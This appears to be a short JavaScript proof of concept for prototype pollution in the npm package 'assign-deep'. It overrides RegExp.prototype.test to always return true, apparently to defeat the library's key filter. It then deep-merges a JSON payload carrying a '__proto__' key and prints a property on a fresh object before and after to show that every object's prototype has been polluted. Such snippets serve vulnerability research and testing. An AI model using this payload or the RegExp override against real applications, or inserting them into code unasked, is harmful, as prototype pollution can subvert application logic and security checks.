RegExp.prototype.test = () => true;
const assign = require('assign-deep');
const payloads = ['{"__proto__": {"polluted": "yes"}}'];
var obj = {};
console.log({}.polluted);
assign({}, JSON.parse(payloads[0]));
console.log({}.polluted);